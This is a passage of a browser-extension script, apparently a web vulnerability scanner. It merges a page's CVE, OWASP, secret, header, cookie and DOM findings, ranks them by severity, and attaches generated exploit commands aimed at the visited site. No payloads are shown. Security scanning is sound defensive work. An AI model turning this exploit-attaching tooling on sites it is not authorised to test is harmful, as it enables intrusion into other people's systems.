      libsForUI[lib] = { version: info.v, method: info.m };
    }

    // Unified vulnerabilities array — everything in one place, sorted by severity
    const vulnerabilities = [
      ...cveFindings.map(f => ({ ...f, source: "CVE" })),
      ...(wordpress.cve || []).map(f => ({ ...f, source: "WordPress" })),
      ...owasp.map(f => ({ ...f, source: "OWASP" })),
      ...secrets.map(f => ({ ...f, source: "Secrets" })),
      ...headers.map(f => ({ ...f, source: "Headers" })),
      ...cookies.filter(f => f.severity !== "LOW" && f.severity !== "INFO").map(f => ({ ...f, source: "Cookies" })),
      ...domSinks.map(f => ({ ...f, source: "DOM" })),
      ...forms.map(f => ({ ...f, source: "Forms" })),
      ...infoDisc.map(f => ({ ...f, source: "Info" })),
      ...cookies.filter(f => f.severity === "LOW" || f.severity === "INFO").map(f => ({ ...f, source: "Cookies" })),
    ];
    vulnerabilities.sort((a, b) => (GODSEYE_SEVERITY_WEIGHT[b.severity] || 0) - (GODSEYE_SEVERITY_WEIGHT[a.severity] || 0));

    // Attach exploit commands from CVE exploit-gen to matching vulns
    for (const vuln of vulnerabilities) {
      if (vuln.cve && !vuln.exploit) {
        const resolved = resolveExploitCommands(vuln.cve, location.origin);
        if (resolved) {
          vuln.exploit = resolved.tools;
          if (resolved.burp) vuln.burp = resolved.burp;
        }
      }
    }

    const results = {
      libraries: libsForUI,
      vulnerabilities: vulnerabilities,
      wordpress: wordpress.isWP ? wordpress : null,
      nextjs: nextjs,
      reactInference: reactInference,
      cssFrameworks: Object.fromEntries(css),
      attackSurface: attackSurface,
      meta: {
        url: location.href,
        timestamp: Date.now(),
        detectionMethods: ["main_world", "dom_properties", "banners", "script_urls", "source_maps", "css_fingerprint", "wordpress", "owasp"],
      }
    };

    // Badge count — HIGH + CRITICAL only
    const badgeCount = vulnerabilities.filter(v => v.severity === "CRITICAL" || v.severity === "HIGH").length;

    try { chrome.runtime.sendMessage({ action: "update_badge", count: badgeCount }); } catch (_) {}

    return results;
  }

  // Run scan and store results
  let scanResults = null;

  runFullScan().then(results => {
    scanResults = results;
  });

  // Message listener
  chrome.runtime.onMessage.addListener((req, sender, sendResponse) => {
    if (req.action === "get_scan") {
      if (scanResults) {
        sendResponse(scanResults);
        return false;
      }
      // Scan still running — wait for it
      runFullScan().then(results => {
        scanResults = results;
        sendResponse(results);
      });
      return true;
    }
  });

})();
